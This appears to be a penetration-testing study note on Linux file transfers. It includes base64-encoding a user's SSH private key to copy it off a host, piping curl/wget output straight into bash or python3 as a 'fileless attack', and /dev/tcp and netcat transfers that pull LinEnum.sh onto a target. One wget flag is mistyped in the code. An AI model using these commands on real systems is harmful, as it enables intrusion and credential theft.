# File Transfers

## Linux File Transfer Methods

### Base64 encoding

This is helpful in scenarios like <mark style="color:green;">copying the ssh key of a user to our local machine.</mark>

```bash
$cat id_rsa |base64 -w 0;echo
#Now we decode the data on the other machine:
$echo -n "encoded string" | base64 -d > id_rsa
```

to verify if the transfer was indeed successful we could check the md5 hashes on the two machines:

```bash
$md5sum id_rsa
```

### cURL / wget

```bash
$wget <url> -O output_filename
$curl <url> -o output_filename
```

We could turn the functioning of pipes to our advantage to make a fileless attack.&#x20;

```bash
$wget -q0- <url_to_a_bash_script> | bash
$curl  <url_to_a_python_script> | python3
```

{% hint style="danger" %}
The <mark style="color:red;">`-qO-`</mark> option is necessary for wget to function correctly because if not specified, it will indeed download the file. <mark style="color:red;">`-`</mark> stands for STDOUT which is then piped directly to the python interpreter.
{% endhint %}

### Download with Bash (/dev/tcp)

We should start a listener on a machine (our host or the target's) then use the built-in /dev/TCP device file to open a connection.

```bash
attack@attack$nc -nlvp <port>
```

<pre class="language-bash"><code class="lang-bash">target@target$exec <a data-footnote-ref href="#user-content-fn-1">3&#x3C;></a>/dev/tcp/machine-to-connect-to/port
target@target$echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&#x26;3
target@target$cat &#x3C;&#x26;3 > LinEnum.sh # Reads from FD3 and saves it to LinEnum.sh
</code></pre>

Or you could upload the file from your machine using:

```bash
target@target$nc -lvp 4444 > file_on_target
```

```bash
attack@attack$exec 3<>/dev/tcp/target-ip/port
attack@attack$cat my_file >&3
```

And finally to close the connection:

```bash
$exec 3<&- 3>&-
```

{% hint style="info" %}
<mark style="color:blue;">In conclusion, the</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`/dev/tcp/hostname/ip`</mark> <mark style="color:blue;"></mark><mark style="color:blue;">is our go-to if the wget, cURL or any other method can't work since it might be already compiled (it is by default as long as bash is v2.04 or greater).</mark>

<mark style="color:blue;">The idea is to</mark>

* <mark style="color:blue;">open a listener on a machine (target or attacking host)</mark>
* &#x20;<mark style="color:blue;">launch a connection with the built-in dev file from the other.</mark>
* <mark style="color:blue;">Use a GET request or</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`cat`</mark> <mark style="color:blue;"></mark><mark style="color:blue;">command and then rediret it to the FD... It all depends on the need and the method available since inbound or outbound connections could be denied and restricted.</mark>

<mark style="color:blue;">About the 3<> part of the command :</mark>

* <mark style="color:blue;">`3`</mark> <mark style="color:blue;"></mark><mark style="color:blue;">refers to the file descriptor number. In Unix-like systems, file descriptors are used to manage input/output streams. File descriptors</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`0`</mark><mark style="color:blue;">,</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`1`</mark><mark style="color:blue;">, and</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`2`</mark> <mark style="color:blue;"></mark><mark style="color:blue;">correspond to standard input, output, and error, respectively. The number</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`3`</mark> <mark style="color:blue;"></mark><mark style="color:blue;">is chosen here to create a new file descriptor for the TCP connection.</mark>
* <mark style="color:blue;">The</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`<>`</mark> <mark style="color:blue;"></mark><mark style="color:blue;">syntax means "open for reading and writing." This opens the file descriptor</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`3`</mark> <mark style="color:blue;"></mark><mark style="color:blue;">as both readable and writable, allowing you to send data to and receive data from the remote server.</mark>
{% endhint %}

[^1]: Explained below.
